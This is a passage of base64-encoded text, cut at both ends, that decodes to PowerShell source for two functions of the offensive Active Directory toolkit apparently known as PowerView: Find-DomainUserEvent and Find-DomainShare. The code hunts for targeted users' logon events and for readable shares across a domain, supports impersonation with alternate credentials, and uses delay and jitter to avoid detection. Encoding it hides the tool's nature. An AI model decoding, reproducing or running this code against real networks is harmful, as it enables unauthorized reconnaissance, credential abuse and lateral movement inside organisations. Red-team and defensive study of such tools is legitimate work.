JvdXBTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluR3JvdXBNZW1iZXIgQEdyb3VwU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXJOYW1lCiAgICAgICAgfQoKICAgICAgICAjIGJ1aWxkIHRoZSBzZXQgb2YgY29tcHV0ZXJzIHRvIGVudW1lcmF0ZQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIGlmIG5vdCAtQ29tcHV0ZXJOYW1lIGlzIHBhc3NlZCwgcXVlcnkgdGhlIGN1cnJlbnQgKG9yIHRhcmdldCkgZG9tYWluIGZvciBkb21haW4gY29udHJvbGxlcnMKICAgICAgICAgICAgJERDU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0xEQVAnID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkRENTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRENTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIFF1ZXJ5aW5nIGZvciBkb21haW4gY29udHJvbGxlcnMgaW4gZG9tYWluOiAkRG9tYWluIgogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbnRyb2xsZXIgQERDU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycyAtYW5kICgkVGFyZ2V0Q29tcHV0ZXJzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkpIHsKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEAoLCRUYXJnZXRDb21wdXRlcnMpCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogJCgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCkiCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXRDb21wdXRlcnMgJFRhcmdldENvbXB1dGVycyIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpblVzZXJFdmVudF0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KCiAgICAgICAgIyB0aGUgaG9zdCBlbnVtZXJhdGlvbiBibG9jayB3ZSdyZSB1c2luZyB0byBlbnVtZXJhdGUgYWxsIHNlcnZlcnMKICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJFN0YXJ0VGltZSwgJEVuZFRpbWUsICRNYXhFdmVudHMsICRUYXJnZXRVc2VycywgJEZpbHRlciwgJENyZWRlbnRpYWwpCgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgICREb21haW5Vc2VyRXZlbnRBcmdzID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVyTmFtZScgPSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRTdGFydFRpbWUpIHsgJERvbWFpblVzZXJFdmVudEFyZ3NbJ1N0YXJ0VGltZSddID0gJFN0YXJ0VGltZSB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRFbmRUaW1lKSB7ICREb21haW5Vc2VyRXZlbnRBcmdzWydFbmRUaW1lJ10gPSAkRW5kVGltZSB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRNYXhFdmVudHMpIHsgJERvbWFpblVzZXJFdmVudEFyZ3NbJ01heEV2ZW50cyddID0gJE1heEV2ZW50cyB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRDcmVkZW50aWFsKSB7ICREb21haW5Vc2VyRXZlbnRBcmdzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRGaWx0ZXIgLW9yICRUYXJnZXRVc2VycykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFRhcmdldFVzZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluVXNlckV2ZW50IEBEb21haW5Vc2VyRXZlbnRBcmdzIHwgV2hlcmUtT2JqZWN0IHskVGFyZ2V0VXNlcnMgLWNvbnRhaW5zICRfLlRhcmdldFVzZXJOYW1lfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9wZXJhdG9yID0gJ29yJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZpbHRlci5LZXlzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJF8gLWVxICdPcCcpIC1vciAoJF8gLWVxICdPcGVyYXRvcicpIC1vciAoJF8gLWVxICdPcGVyYXRpb24nKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRGaWx0ZXJbJF9dIC1tYXRjaCAnJicpIC1vciAoJEZpbHRlclskX10gLWVxICdhbmQnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9wZXJhdG9yID0gJ2FuZCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzID0gJEZpbHRlci5LZXlzIHwgV2hlcmUtT2JqZWN0IHsoJF8gLW5lICdPcCcpIC1hbmQgKCRfIC1uZSAnT3BlcmF0b3InKSAtYW5kICgkXyAtbmUgJ09wZXJhdGlvbicpfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgR2V0LURvbWFpblVzZXJFdmVudCBARG9tYWluVXNlckV2ZW50QXJncyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9wZXJhdG9yIC1lcSAnb3InKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRLZXkgaW4gJEtleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy4iJEtleSIgLW1hdGNoICRGaWx0ZXJbJEtleV0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGFuZCBhbGwgY2xhdXNlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkS2V5IGluICRLZXlzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uIiRLZXkiIC1ub3RtYXRjaCAkRmlsdGVyWyRLZXldKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEdldC1Eb21haW5Vc2VyRXZlbnQgQERvbWFpblVzZXJFdmVudEFyZ3MKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgIyBvbmx5IGlnbm9yZSB0aHJlYWRpbmcgaWYgLURlbGF5IGlzIHBhc3NlZAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckV2ZW50XSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJFRhcmdldENvbXB1dGVycykgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKCiAgICAgICAgICAgICAgICAjIHNsZWVwIGZvciBvdXIgc2VtaS1yYW5kb21pemVkIGludGVydmFsCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckV2ZW50XSBFbnVtZXJhdGluZyBzZXJ2ZXIgJFRhcmdldENvbXB1dGVyICgkQ291bnRlciBvZiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpKSIKICAgICAgICAgICAgICAgICRSZXN1bHQgPSBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLUFyZ3VtZW50TGlzdCAkVGFyZ2V0Q29tcHV0ZXIsICRTdGFydFRpbWUsICRFbmRUaW1lLCAkTWF4RXZlbnRzLCAkVGFyZ2V0VXNlcnMsICRGaWx0ZXIsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAkUmVzdWx0CgogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWFuZCAkU3RvcE9uU3VjY2VzcykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gVGFyZ2V0IHVzZXIgZm91bmQsIHJldHVybmluZyBlYXJseSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckV2ZW50XSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcyIKCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24KICAgICAgICAgICAgJFNjcmlwdFBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAnU3RhcnRUaW1lJyA9ICRTdGFydFRpbWUKICAgICAgICAgICAgICAgICdFbmRUaW1lJyA9ICRFbmRUaW1lCiAgICAgICAgICAgICAgICAnTWF4RXZlbnRzJyA9ICRNYXhFdmVudHMKICAgICAgICAgICAgICAgICdUYXJnZXRVc2VycycgPSAkVGFyZ2V0VXNlcnMKICAgICAgICAgICAgICAgICdGaWx0ZXInID0gJEZpbHRlcgogICAgICAgICAgICAgICAgJ0NyZWRlbnRpYWwnID0gJENyZWRlbnRpYWwKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbiB1c2luZyB0aGUgJEhvc3RFbnVtQmxvY2sgKyBwYXJhbXMKICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1Eb21haW5TaGFyZSB7CjwjCi5TWU5PUFNJUwoKU2VhcmNoZXMgZm9yIGNvbXB1dGVyIHNoYXJlcyBvbiB0aGUgZG9tYWluLiBJZiAtQ2hlY2tTaGFyZUFjY2VzcyBpcyBwYXNzZWQsCnRoZW4gb25seSBzaGFyZXMgdGhlIGN1cnJlbnQgdXNlciBoYXMgcmVhZCBhY2Nlc3MgdG8gYXJlIHJldHVybmVkLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluQ29tcHV0ZXIsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiwgR2V0LU5ldFNoYXJlLCBOZXctVGhyZWFkZWRGdW5jdGlvbiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gZW51bWVyYXRlcyBhbGwgbWFjaGluZXMgb24gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluCnVzaW5nIEdldC1Eb21haW5Db21wdXRlciwgYW5kIGVudW1lcmF0ZXMgdGhlIGF2YWlsYWJsZSBzaGFyZXMgZm9yIGVhY2gKbWFjaGluZSB3aXRoIEdldC1OZXRTaGFyZS4gSWYgLUNoZWNrU2hhcmVBY2Nlc3MgaXMgcGFzc2VkLCB0aGVuCltJTy5EaXJlY3RvcnldOjpHZXRGaWxlcygpIGlzIHVzZWQgdG8gY2hlY2sgaWYgdGhlIGN1cnJlbnQgdXNlciBoYXMgcmVhZAphY2Nlc3MgdG8gdGhlIGdpdmVuIHNoYXJlLiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsIHRoZW4KSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIGlzIHVzZWQgdG8gaW1wZXJzb25hdGUgdGhlIHNwZWNpZmllZCB1c2VyIGJlZm9yZQplbnVtZXJhdGlvbiwgcmV2ZXJ0aW5nIGFmdGVyIHdpdGggSW52b2tlLVJldmVydFRvU2VsZi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgYW4gYXJyYXkgb2Ygb25lIG9yIG1vcmUgaG9zdHMgdG8gZW51bWVyYXRlLCBwYXNzYWJsZSBvbiB0aGUgcGlwZWxpbmUuCklmIC1Db21wdXRlck5hbWUgaXMgbm90IHBhc3NlZCwgdGhlIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gZW51bWVyYXRlIGFsbCBtYWNoaW5lcwppbiB0aGUgZG9tYWluIHJldHVybmVkIGJ5IEdldC1Eb21haW5Db21wdXRlci4KCi5QQVJBTUVURVIgQ29tcHV0ZXJEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHF1ZXJ5IGZvciBjb21wdXRlcnMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIHNlYXJjaCBmb3IgY29tcHV0ZXIgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTZWFyY2hCYXNlCgpTcGVjaWZpZXMgdGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciBjb21wdXRlcnMsCmUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIuIFVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0KClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIG9wZXJhdGluZyBzeXN0ZW0sIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTZXJ2aWNlUGFjawoKU2VhcmNoIGNvbXB1dGVycyB3aXRoIGEgc3BlY2lmaWMgc2VydmljZSBwYWNrLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2l0ZU5hbWUKClNlYXJjaCBjb21wdXRlcnMgaW4gdGhlIHNwZWNpZmljIEFEIFNpdGUgbmFtZSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDaGVja1NoYXJlQWNjZXNzCgpTd2l0Y2guIE9ubHkgZGlzcGxheSBmb3VuZCBzaGFyZXMgdGhhdCB0aGUgbG9jYWwgdXNlciBoYXMgYWNjZXNzIHRvLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciBmb3IgY29tcHV0ZXJzLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluIGFuZCB0YXJnZXQgc3lzdGVtcy4KCi5QQVJBTUVURVIgRGVsYXkKClNwZWNpZmllcyB0aGUgZGVsYXkgKGluIHNlY29uZHMpIGJldHdlZW4gZW51bWVyYXRpbmcgaG9zdHMsIGRlZmF1bHRzIHRvIDAuCgouUEFSQU1FVEVSIEppdHRlcgoKU3BlY2lmaWVzIHRoZSBqaXR0ZXIgKDAtMS4wKSB0byBhcHBseSB0byBhbnkgc3BlY2lmaWVkIC1EZWxheSwgZGVmYXVsdHMgdG8gKy8tIDAuMwoKLlBBUkFNRVRFUiBUaHJlYWRzCgpUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGZvciB1c2VyIHNlYXJjaGluZywgZGVmYXVsdHMgdG8gMjAuCgouRVhBTVBMRQoKRmluZC1Eb21haW5TaGFyZQoKRmluZCBhbGwgZG9tYWluIHNoYXJlcyBpbiB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKRmluZC1Eb21haW5TaGFyZSAtQ2hlY2tTaGFyZUFjY2VzcwoKRmluZCBhbGwgZG9tYWluIHNoYXJlcyBpbiB0aGUgY3VycmVudCBkb21haW4gdGhhdCB0aGUgY3VycmVudCB1c2VyIGhhcwpyZWFkIGFjY2VzcyB0by4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpGaW5kLURvbWFpblNoYXJlIC1Eb21haW4gdGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKU2VhcmNoZXMgZm9yIGRvbWFpbiBzaGFyZXMgaW4gdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluIHVzaW5nIHRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKClBvd2VyVmlldy5TaGFyZUluZm8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5TaGFyZUluZm8nKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRE5TSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NpdGVOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTaXRlTmFtZSwKCiAgICAgICAgW0FsaWFzKCdDaGVja0FjY2VzcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrU2hhcmVBY2Nlc3MsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkRGVsYXkgPSAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCgogICAgICAgIFtJbnRdCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwKV0KICAgICAgICAkVGhyZWFkcyA9IDIwCiAgICApCgogICAgQkVHSU4gewoKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVW5jb25zdHJhaW5lZCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydVbmNvbnN0cmFpbmVkJ10gPSAkVW5jb25zdHJhaW5lZCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAk